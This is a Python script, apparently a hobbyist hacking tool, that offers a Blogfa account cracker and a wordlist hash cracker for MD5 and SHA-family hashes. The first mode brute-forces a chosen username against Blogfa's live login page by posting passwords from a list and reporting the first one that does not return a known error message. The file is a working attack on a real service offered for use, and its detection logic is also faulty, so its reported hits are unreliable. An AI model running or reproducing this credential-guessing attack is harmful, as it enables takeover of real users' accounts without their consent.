import requests as req
from bs4 import BeautifulSoup
from colorama import Fore as f
import os , sys
import time
import hashlib

platform = sys.platform

BLUE        = f.BLUE
GREEN       = f.GREEN
RED         = f.RED
CYEN        = f.CYAN
WHITE       = f.WHITE
YELLOW      = f.YELLOW
MAGENTA     = f.MAGENTA

def banner():
    print(f'''
                        {BLUE}                         __
{RED}   ____ ___  _________  {BLUE}   ______________ ______/ /_____  _____
{RED}  / __ `__ \/ ___/_  /  {BLUE}  / ___/ ___/ __ `/ ___/ //_/ _ \/ ___/
{RED} / / / / / / /    / /_  {BLUE} / /__/ /  / /_/ / /__/ ,< /  __/ /
{RED}/_/ /_/ /_/_/    /___/  {BLUE} \___/_/   \__,_/\___/_/|_|\___/_/
''')
    
    print(f"""      {GREEN}Github -> {YELLOW}https://github.com/MReza-R4nJel
    """)
    print(f"""      {GREEN}Telegram -> {YELLOW}https://t.me/MReza-Devill             {BLUE} Written {YELLOW}by {RED}MREZA-RANJEL 
    """)
    print(f"""      {GREEN}Instagram -> {YELLOW}https://instagram.com/mohmdrza_null
    """)
    print(f.CYAN+'_'*40 + f"{RED}M{YELLOW}R{BLUE}E{GREEN}Z{MAGENTA}A" + CYEN + '_'*40)
    print('')

def blogfaCracker():
    print(f'''  
{MAGENTA}    __    __            ____      {RED}                        __
{MAGENTA}   / /_  / /___  ____ _/ __/___ _ {RED}  ______________ ______/ /_____  _____
{MAGENTA}  / __ \/ / __ \/ __ `/ /_/ __ `/ {RED} / ___/ ___/ __ `/ ___/ //_/ _ \/ ___/
{MAGENTA} / /_/ / / /_/ / /_/ / __/ /_/ /  {RED}/ /__/ /  / /_/ / /__/ ,< /  __/ /
{MAGENTA}/_.___/_/\____/\__, /_/  \__,_/   {RED}\___/_/   \__,_/\___/_/|_|\___/_/
{MAGENTA}              /____/
''')

    passwordsList = input(RED + " [*] " + WHITE + "Enter your password list file " + CYEN + "(txt)" + WHITE + " : " + GREEN)
    print('')
    try:
        passwords_list = open(passwordsList , "r").read().split()
    except:
        print(RED + ' [x] ' + WHITE + 'Please give correct address')
    userne = input(RED + ' [*] ' + WHITE + 'Enter Username : ')
    print('')
    print(f.RED + " [x] " + f.GREEN + "Target -> " + f.WHITE + f'https://{userne}.blogfa.com')
    print('')
    login_URL = "https://www.blogfa.com/desktop/login.aspx"
    URL = req.get(login_URL)
    info = URL.text
    information = BeautifulSoup(info , 'html.parser')
    mreza = information.find('input')['value']
    error =  "کلمه عبور را اشتباه وارد کرده اید"
    eror = "در حال حاضر به دلیل حفظ امنیت کاربران امکان ورود به بخش مدیریت را ندارید"
    erorr = "کلمه عبور را اشتباه وارد کرده اید، ممکن است استفاده از حروف فارسی یا غیر معمول باعث این مشکل شده باشد"
    print(f.LIGHTRED_EX+" [!] " + f.LIGHTCYAN_EX+"""Please wait for crack
        """)
    try:
        for passwd in passwords_list:
            payload = {"_tt":mreza,"usrid":userne,"ups":passwd,"BtnSubmit":"ورود+به+بخش+مدیریت+وبلاگ"}
            mrz = req.post(login_URL , data = payload)
            rqPost = mrz.text
            blog = BeautifulSoup(rqPost, 'html.parser')
            c = blog.find_all('i')
            data = str(c)
            if error not in data:
                print(f.GREEN + " [/] " + f.WHITE + "password is -> " , passwd)
                sys.exit()
            elif erorr not in data:
                print(f.GREEN + " [/] " + f.WHITE + "password is -> " , passwd)
                sys.exit()
            elif eror not in data:
                print(f.GREEN + " [/] " + f.WHITE + "password is -> " , passwd)
                sys.exit()
            else: 
                continue
            
            print(f"{RED} [x] {WHITE}Password not found !")
    except:
        print('')
        print(" [-] please check your internet or URL or username")


def Hash_cracker():
    
    print(f"""
{RED}    __               __   {YELLOW}                         __
{RED}   / /_  ____ ______/ /_  {YELLOW}   ______________ ______/ /_____  _____
{RED}  / __ \/ __ `/ ___/ __ \ {YELLOW}  / ___/ ___/ __ `/ ___/ //_/ _ \/ ___/
{RED} / / / / /_/ (__  ) / / / {YELLOW} / /__/ /  / /_/ / /__/ ,< /  __/ /         {YELLOW}Written by{MAGENTA} MREZA Ranjel
{RED}/_/ /_/\__,_/____/_/ /_/  {YELLOW} \___/_/   \__,_/\___/_/|_|\___/_/

{RED}   [*] {GREEN}1- md5
{RED}   [*] {GREEN}2- sha1
{RED}   [*] {GREEN}3- sha224
{RED}   [*] {GREEN}4- sha384
{RED}   [*] {GREEN}5- sha512
""")

    algorithm = input(RED + " [*] " + WHITE + "Your algorithm" + CYEN + " [ENTER]" + WHITE + " : ")
    print('')

    def md5a():
        Hash = input(RED + " [*] " + WHITE + "Your hash [ENTER] : ")
        print('')
        passfile = input(RED + " [*] " + WHITE + "Enter your password list file " + CYEN + "(txt)" + WHITE + " : " + GREEN)
        try:
            passwordList = open(passfile , "r").read().split()
        except:
            print('')
            print(RED + ' [x] ' + WHITE + 'Please give correct address')
            print('')
            passfile = input(RED + " [*] " + WHITE + "Enter your password list file " + CYEN + "(txt)" + WHITE + " : " + GREEN)
            passwordList = open(passfile , "r").read().split()

        for hashCracking in passwordList:
            a = hashCracking.encode()
            m = hashlib.md5(a).hexdigest()
            if m == Hash:
                print('')
                print(GREEN + " [/] " + WHITE + "Password found -> " + YELLOW + "[ " + WHITE + hashCracking + YELLOW + " ]")
                break
            else:
                continue
            
            print(f"{RED} [x] {WHITE}Password not found !")

        
    def sha1a():
        Hash = input(RED + " [*] " + WHITE + "Your hash [ENTER] : ")
        print('')
        passfile = input(RED + " [*] " + WHITE + "Enter your password list file " + CYEN + "(txt)" + WHITE + " : " + GREEN)
        try:
            passwordList = open(passfile , "r").read().split()
        except:
            print('')
            print(RED + ' [x] ' + WHITE + 'Please')
        for hashCracking in passwordList:
            a = hashCracking.encode()
            m = hashlib.sha1(a).hexdigest()
            if m == Hash:
                print('')
                print(GREEN + " [/] " + WHITE + "Password found -> " + YELLOW + "[ " + WHITE + hashCracking + YELLOW + " ]")
                break
            else:
                continue
            
            print(f"{RED} [x] {WHITE}Password not found !")
        

    def sha224a():
        Hash = input(RED + " [*] " + WHITE + "Your hash [ENTER] : ")
        print('')
        passfile = input(RED + " [*] " + WHITE + "Enter your password list file " + CYEN + "(txt)" + WHITE + " : " + GREEN)
        try:
            passwordList = open(passfile , "r").read().split()
        except:
            print('')
            print(RED + ' [x] ' + WHITE + 'Please')
        for hashCracking in passwordList:
            a = hashCracking.encode()
            m = hashlib.sha224(a).hexdigest()
            if m == Hash:
                print('')
                print(GREEN + " [/] " + WHITE + "Password found -> " + YELLOW + "[ " + WHITE + hashCracking + YELLOW + " ]")
                break
            else:
                continue
            print(f"{RED} [x] {WHITE}Password not found !")

    def sha384a():
        Hash = input(RED + " [*] " + WHITE + "Your hash [ENTER] : ")
        print('')
        passfile = input(RED + " [*] " + WHITE + "Enter your password list file " + CYEN + "(txt)" + WHITE + " : " + GREEN)
        try:
            passwordList = open(passfile , "r").read().split()
        except:
            print('')
            print(RED + ' [x] ' + WHITE + 'Please')
        for hashCracking in passwordList:
            a = hashCracking.encode()
            m = hashlib.sha384(a).hexdigest()
            if m == Hash:
                print('')
                print(GREEN + " [/] " + WHITE + "Password found -> " + YELLOW + "[ " + WHITE + hashCracking + YELLOW + " ]")
                break
            else:
                continue
            print(f"{RED} [x] {WHITE}Password not found !")

    def sha512a():
        Hash = input(RED + " [*] " + WHITE + "Your hash [ENTER] : ")
        print('')
        passfile = input(RED + " [*] " + WHITE + "Enter your password list file " + CYEN + "(txt)" + WHITE + " : " + GREEN)
        try:
            passwordList = open(passfile , "r").read().split()
        except:
            print('')
            print(RED + ' [x] ' + WHITE + 'Please hoose correctly !')
        for hashCracking in passwordList:
            a = hashCracking.encode()
            m = hashlib.sha512(a).hexdigest()
            if m == Hash:
                print('')
                time.sleep(2)
                print(GREEN + " [/] " + WHITE + "Password found -> " + YELLOW + "[ " + WHITE + hashCracking + YELLOW + " ]")
                break
            else:
                continue
            
            print(f"{RED} [x] {WHITE}Password not found !")


    if algorithm == '1':
        md5a()
    elif algorithm == '2':
        sha1a()
    elif algorithm == '3':
        sha224a()
    elif algorithm == '4':
        sha384a()
    elif algorithm == '5':
        sha512a()

banner()

print(f"""
     {RED} [1] -> {YELLOW} Blogfa account cracker{MAGENTA} | {RED}[2] ->{YELLOW} Hash cracker
""")
selection = input(f.RED+" [?] " + f.GREEN + "Which one do you choose : ")

try:
    if selection == '1':
        time.sleep(2)
        if "win" in platform:
            os.system("cls")
        else:
            os.system("clear")
        blogfaCracker()
    elif selection == '2':
        time.sleep(2)
        if 'win' in platform:
            os.system('cls')
        else:
            os.system('clear')
        Hash_cracker()
except ConnectionError:
    print("Please check you internet")
